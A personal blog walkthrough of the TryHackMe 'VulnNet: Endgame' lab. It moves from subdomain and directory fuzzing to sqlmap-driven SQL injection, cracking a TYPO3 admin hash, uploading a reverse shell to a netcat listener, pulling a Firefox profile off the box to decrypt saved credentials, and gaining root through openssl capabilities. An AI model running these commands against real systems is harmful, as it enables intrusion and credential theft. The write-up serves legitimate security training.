---
layout: post
author: L0
---

# THM-VulnNet-Endgame

![image](/images/Pasted image 20221105204519.png)

## Enumeration

### nmap

```shell
$ sudo nmap -sV -p- vulnnet
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-05 15:47 EDT
Nmap scan report for vulnnet (10.10.31.75)
Host is up (0.037s latency).
rDNS record for 10.10.31.75: vulnnet.thm
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

nmap reveals just 2 open Ports

- `22` SSH Service
- `80` Apache Web Server

### website

first i checked the website. nothing special so more enumerating.

![image](/images/Pasted image 20221105204852.png)

### dirbusting

```shell
$ ffuf -w `fzf-wordlist` -u http://vulnnet.thm/FUZZ

.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 1000ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 1908ms]
                        [Status: 200, Size: 4346, Words: 341, Lines: 131, Duration: 3996ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 35ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4926ms]
fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 35ms]
images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 36ms]
index.html              [Status: 200, Size: 4346, Words: 341, Lines: 131, Duration: 35ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 35ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 36ms]
```

dirbusting revealed a few directories but nothing of interest.

### subdomain fuzzing

```shell
$ ffuf -w `fzf-wordlist` -u http://vulnnet.thm -H "Host: FUZZ.vulnnet.thm" -fs 65

api                     [Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 1372ms]
blog                    [Status: 200, Size: 19316, Words: 1236, Lines: 391, Duration: 4152ms]
shop                    [Status: 200, Size: 26701, Words: 11619, Lines: 525, Duration: 4387ms]
admin1                  [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 131ms]
```

with subdomain enumeration i found a few hits.

![image](/images/Pasted image 20221105205714.png)

there is a admin panel online somewhere.

![image](/images/Pasted image 20221105205805.png)

API is also available, but not yet found any endpoint.

![image](/images/Pasted image 20221107213912.png)
![image](/images/Pasted image 20221107213957.png)

### more dirbusting

and two more web sites to scan through.

```shell
$ ffuf -w `fzf-wordlist` -u http://admin1.vulnnet.thm/FUZZ

.hta                    [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 36ms]
.htaccess               [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 37ms]
.htpasswd               [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 38ms]
                        [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 59ms]
en                      [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 37ms]
fileadmin               [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 35ms]
server-status           [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 37ms]
typo3temp               [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 37ms]
typo3conf               [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 37ms]
typo3                   [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 38ms]
vendor                  [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 38ms]
```

starting with the admin page i did another directory scan and found something./

![image](/images/Pasted image 20221105210116.png)

a typo3 login page, that should belong to the management panel.

![image](/images/Pasted image 20221107214635.png)

and a filedamin page, that looks like an upload page where we could execute an uploaded reverse shell later.
i spend to much time on the other directories. nothing found there.

I dirbusted the other subdomain, but nothing special popped up. then i found something in the source of a blog post. `http://blog.vulnnet.thm/post5.php`

![image](/images/Pasted image 20221105231125.png)

### API SQLI

finally the api endpoint i was missing. it turned out it was vulnerable to SQLI

![image](/images/Pasted image 20221105231548.png)
![image](/images/Pasted image 20221105231633.png)
![image](/images/Pasted image 20221105231754.png)
![image](/images/Pasted image 20221107221157.png)

i got the database named `blog` and inside was a table named `users`. after dumping the columns `username` and `password` i tried to login with ssh and of course the typo3 login. but it did not work. i tried to find out why there was something missing. `sqlmap` needed to help me.

### sqlmap

````

```shell
$ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=0 --dbs

[16:16:01] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin
sq```

there are more databases actually. checking `vn_admin` got a lot of tables.

```shell
$ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=0 -D vn_admin --tables

+---------------------------------------------+
| backend_layout                              |
| be_dashboards                               |
| be_groups                                   |
| be_sessions                                 |
| be_users                                    |
| cache_adminpanel_requestcache               |
| cache_adminpanel_requestcache_tags          |
| cache_hash                                  |
| cache_hash_tags                             |
| cache_imagesizes                            |
| cache_imagesizes_tags                       |
| cache_pages                                 |
| cache_pages_tags                            |
| cache_pagesection                           |
| cache_pagesection_tags                      |
| cache_rootline                              |
| cache_rootline_tags                         |
| cache_treelist                              |
| fe_groups                                   |
| fe_sessions                                 |
| fe_users                                    |
| pages                                       |
| sys_be_shortcuts                            |
| sys_category                                |
| sys_category_record_mm                      |
| sys_collection                              |
| sys_collection_entries                      |
| sys_file                                    |
| sys_file_collection                         |
| sys_file_metadata                           |
| sys_file_processedfile                      |
| sys_file_reference                          |
| sys_file_storage                            |
| sys_filemounts                              |
| sys_history                                 |
| sys_language                                |
| sys_lockedrecords                           |
| sys_log                                     |
| sys_news                                    |
| sys_note                                    |
| sys_redirect                                |
| sys_refindex                                |
| sys_registry                                |
| sys_template                                |
| tt_content                                  |
| tx_extensionmanager_domain_model_extension  |
| tx_extensionmanager_domain_model_repository |
| tx_impexp_presets                           |
+---------------------------------------------+
````

but `be_users` should be `backend` users. so, something i was looking for. and there was the admin user.

```shell
$ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=0 -D vn_admin -T be_users -C admin,username,password --dump

Database: vn_admin
Table: be_users
[1 entry]
+-------+----------+---------------------------------------------------------------------------------------------------+
| admin | username | password                                                                                          |
+-------+----------+---------------------------------------------------------------------------------------------------+
| 1     | chris_w  | $argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg |
+-------+----------+---------------------------------------------------------------------------------------------------+
```

i tried a few word lists with `john` but nothing worked. i even tried easy password list with the user name `chris_w` and `hydra` but also nothing.

i remembered to check why the blog users were not complete. so i enumerated again with `sqlmap` and i found actually 650 usernames with passwords.

```shell
$ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=0 -D blog -T users --dump
...
| 645 | 2QZrPJ2             | jovenhw            |
| 646 | t0xmZtLTXa          | gboayshx           |
| 647 | 09jD21OoQ           | asuermeiershy      |
| 648 | OBJZD6f             | msambidgehz        |
| 649 | Cc4QOkuSvrF         | bhuertai0          |
| 650 | kSKBUj8             | oboatmani1         |
| 651 | BIkqvmX             | rtamblingi2        |
+-----+---------------------+--------------------+
```

### john

after putting all usernames and passwords in one long word list i tried `john` again and got the password.

```shell
$ john --wordlist=poss_pws.txt chris_w.pw

?:v*********z

1 password hash cracked, 0 left
```

Using the username and password i found, i was able to login to the admin panel.

### getting reverse shell

![image](/images/Pasted image 20221107223246.png)

Reading through the panel options i found the upload function i mentioned earlier. this must be the way in.

![image](/images/Pasted image 20221107223308.png)

unfortunately i found an upload filter setting that is active. i tried to get around it but was not successful.

![image](/images/Pasted image 20221107223410.png)

i looked further and found where i could change the setting and just deleted the filter. now i needed to start a listener and upload the reverse shell.

![image](/images/Pasted image 20221107223513.png)

![image](/images/Pasted image 20221107223633.png)

i got the shell and started to look around.

```shell
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.1.199] from (UNKNOWN) [10.10.79.39] 55208
Linux vulnnet-endgame 5.4.0-120-generic #136~18.04.1-Ubuntu SMP Fri Jun 10 18:00:44 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 16:42:30 up  1:07,  0 users,  load average: 0.00, 0.00, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

### Privesc

on the machine is only one home directory of the user `system`

```shell
$ cd /home/system
$ ls -la
total 92
drwxr-xr-x 18 system system 4096 Jun 15 17:12 .
drwxr-xr-x  3 root   root   4096 Jun 14 11:25 ..
-rw-------  1 system system 2124 Jun 15 17:11 .ICEauthority
lrwxrwxrwx  1 root   root      9 Jun 14 13:28 .bash_history -> /dev/null
-rw-r--r--  1 system system  220 Jun 14 11:25 .bash_logout
-rw-r--r--  1 system system 3771 Jun 14 11:25 .bashrc
drwx------ 16 system system 4096 Jun 14 12:02 .cache
drwx------ 14 system system 4096 Jun 14 12:50 .config
drwx------  3 root   root   4096 Jun 14 12:02 .dbus
drwx------  3 system system 4096 Jun 14 11:35 .gnupg
drwx------  2 root   root   4096 Jun 14 12:02 .gvfs
drwx------  3 system system 4096 Jun 14 11:35 .local
drwxr-xr-x  4 system system 4096 Jun 14 11:56 .mozilla
lrwxrwxrwx  1 root   root      9 Jun 14 13:28 .mysql_history -> /dev/null
-rw-r--r--  1 system system  807 Jun 14 11:25 .profile
-rw-r--r--  1 system system    0 Jun 14 11:36 .sudo_as_admin_successful
drwxr-xr-x  2 system system 4096 Jun 14 11:35 Desktop
drwxr-xr-x  2 system system 4096 Jun 14 11:35 Documents
drwxr-xr-x  2 system system 4096 Jun 14 11:35 Downloads
drwxr-xr-x  2 system system 4096 Jun 14 11:35 Music
drwxr-xr-x  2 system system 4096 Jun 14 11:35 Pictures
drwxr-xr-x  2 system system 4096 Jun 14 11:35 Public
drwxr-xr-x  2 system system 4096 Jun 14 11:35 Templates
dr-xr-x---  2 system system 4096 Jun 14 13:24 Utils
drwxr-xr-x  2 system system 4096 Jun 14 11:35 Videos
-rw-------  1 system system   38 Jun 14 13:22 user.txt
```

i looked into all folders and couldn't see right away what might be the attack vector. for sure i can not read the `user.txt`

> the Directory `Utils` is only accessible by the user `system`. this might be the next step after we own `system`
{: .prompt-info }

after doing the usual privilege escalation enumeration manually and with linpeas i came back to the home directory. i was sure something is wrong with the mozille folder. why is it here?

and after digging into google i found something about firefox profiles and credentials inside. unfortunately these credentials are encrypted.

this tool might help me out.
[firefox_decypt](https://github.com/unode/firefox_decrypt)

i need at least python 3.9 installed to work with the latest version. this was not installed on the victim. so i zipped the mozilla folder to a directory i could write to and downloaded the zipped file with a simple python webserver.

```shell
python3 -m http.server 9000
```

```shell
wget http://vulnnet.thm:9000/mozilla.zip
```

after downloading `firefox_decryt` i executed the command but something was not working.

```shell
$ python3 ../../../../firefox_decrypt.py .
Select the Mozilla profile you wish to decrypt
1 -> 2o9vd4oi.default
2 -> 8mk7ix79.default-release
1
2022-11-09 04:18:39,262 - ERROR - Couldn't initialize NSS, maybe './2o9vd4oi.default' is not a valid profile?
```

```shell
$ python3 ../../../../firefox_decrypt.py .
Select the Mozilla profile you wish to decrypt
1 -> 2o9vd4oi.default
2 -> 8mk7ix79.default-release
2
2022-11-09 04:18:46,751 - ERROR - Couldn't find credentials file (logins.json or signons.sqlite).
```

i looked again though the folders and recognized there is a third folder that is not listed in the `profile` file.a

```shell
$ ls -la
total 36
drwxr-xr-x  7 j0j0pupp3 j0j0pupp3 4096 Nov  9 04:16  .
drwxr-xr-x  4 j0j0pupp3 j0j0pupp3 4096 Jun 14 11:56  ..
drwxr-xr-x 13 j0j0pupp3 j0j0pupp3 4096 Jun 14 10:43  2fjnrwth.default-release
drwxr-xr-x  2 j0j0pupp3 j0j0pupp3 4096 Jun 14 11:56  2o9vd4oi.default
drwxr-xr-x 13 j0j0pupp3 j0j0pupp3 4096 Jun 14 13:37  8mk7ix79.default-release
drwxr-xr-x  3 j0j0pupp3 j0j0pupp3 4096 Jun 14 11:56 'Crash Reports'
-rwxr-xr-x  1 j0j0pupp3 j0j0pupp3   62 Jun 14 11:56  installs.ini
drwxr-xr-x  2 j0j0pupp3 j0j0pupp3 4096 Jun 14 11:56 'Pending Pings'
-rwxr-xr-x  1 j0j0pupp3 j0j0pupp3  259 Nov  9 04:16  profiles.ini
```

![image](/images/Pasted image 20221109102126.png)

i changed the `profile` file like this and ran the script again.

![image](/images/Pasted image 20221109102252.png)

finally the password. and it was the password for the user `system`.

```shell
 python3 ../../../../firefox_decrypt.py .
Select the Mozilla profile you wish to decrypt
1 -> 2o9vd4oi.default
2 -> 2fjnrwth.default-release
2

Website:   https://tryhackme.com
Username: 'chris_w@vulnnet.thm'
Password: '8***************b'
```

now i could log back in with ssh as the user `system`

### getting root

```shell
system@vulnnet-endgame:~$ id
uid=1000(system) gid=1000(system) groups=1000(system)
```

now i could read the `user.txt` and got the first flag.

![image](/images/Pasted image 20221109102650.png)

as we remember correctly we can now access the directory `Utils`

```shell
system@vulnnet-endgame:~/Utils$ ll
total 1104
dr-xr-x---  2 system system   4096 Jun 14 13:24 ./
drwxr-xr-x 18 system system   4096 Jun 15 17:12 ../
-r-xr-x---  1 system system 723944 Jun 14 13:23 openssl*
-r-xr-x---  1 system system 178312 Jun 14 13:24 unzip*
-r-xr-x---  1 system system 216256 Jun 14 13:23 zip*
```

3 binaries are placed inside. `openssl`, `unzip`, `zip`. first i checked the versions of all binaries and if they are vulnerable but was not lucky.

then another longer search followed with following result.
if i check capabilities with this command:

```shell
getcap -r / 2>/dev/null

/home/system/Utils/openssl =ep
/snap/core20/1081/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

`openssl` gets listed and after searching for that i found an exploit online under this link.
[openssl cap ex](https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/)

following the instructions required to create an engine file which sets the suid bit and executes a shell from within. after doing that i needed to upload the engine file and use it with this command.

```shell
system@vulnnet-endgame:~/Utils$ ./openssl req -engine ../openssl-exploit-engine.so
root@vulnnet-endgame:~/Utils# whoami
root
```

and there is the root flag.

![image](/images/Pasted image 20221109103520.png)

[L0]
